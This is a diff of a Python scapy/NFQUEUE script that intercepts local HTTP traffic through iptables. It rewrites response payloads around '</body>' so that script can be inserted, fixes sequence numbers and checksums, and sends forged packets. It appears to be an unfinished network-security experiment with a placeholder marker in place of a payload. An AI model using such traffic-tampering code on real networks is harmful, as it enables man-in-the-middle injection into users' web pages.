@@ -18,9 +18,7 @@ def callback(pkt):
         if data.proto == PROTO_TCP and data.sport == PORT_WWW_HTTP: # incoming
             print(data.summary(), data.seq, data.ack)
             S = (data.dst, data.dport)
-            if S not in sessions:
-                sessions[S] = {'offset': 0, 'FIN_count': 0}
-            print(bytes(data))
+            # data.show()
             if S in sessions:
                 data[TCP].ack -= sessions[S]['offset']
                 # print(len(bytes(data[TCP].payload)))
@@ -30,7 +28,7 @@ def callback(pkt):
                 if loc != -1: # didn't consider the case where '</body>' itself is a string, e.g., "var x = '</body>';".
                     # find the enclosing </body>
                     # should insert script before </body>
-                    raw = raw[:loc] + '</yyyy>' + raw[loc + 7:]
+                    # raw = raw[:loc] + '?????' + raw[loc:]
                     # raw = ' ' * len(raw)
 
                     data[TCP].payload = bytes(raw, 'utf-8')
@@ -39,14 +37,12 @@ def callback(pkt):
                     # print(bytes(data))
                     pkt.set_payload(bytes(data))
 
-                    data[TCP].payload = bytes(' ' * len(raw), 'utf-8')
+                    data[TCP].payload = bytes(MARK, 'utf-8')
                     # sessions[S]['offset'] = len(MARK)
                     del data[TCP].chksum
                     del data[IP].chksum
-                    # data.show2()
-                    # sendp(data)
-                    # pkt.drop()
-                    # return
+                    sendp(data)
+                    return
             if data[TCP].flags & TCP_FIN and S in sessions:
                 sessions[S]['FIN_count'] += 1
                 if sessions[S]['FIN_count'] >= 2:
@@ -54,7 +50,6 @@ def callback(pkt):
 
         elif data.proto == PROTO_TCP and data.dport == PORT_WWW_HTTP: # outgoing
             print(data.summary(), data.seq, data.ack)
-            print(bytes(data))
             S = (data.src, data.sport)
             if data[TCP].flags == TCP_SYN:
                 sessions[S] = {'offset': 0, 'FIN_count': 0}
@@ -72,7 +67,6 @@ def main():
     rules = [
         f'iptables -I INPUT -j NFQUEUE --queue-num {Qnum} --queue-bypass',
         f'iptables -I OUTPUT -j NFQUEUE --queue-num {Qnum} --queue-bypass',
-        f'iptables -I FORWARD -j NFQUEUE --queue-num {Qnum} --queue-bypass',
     ]
     for rule in rules:
         print(f'setting rule: {rule}')
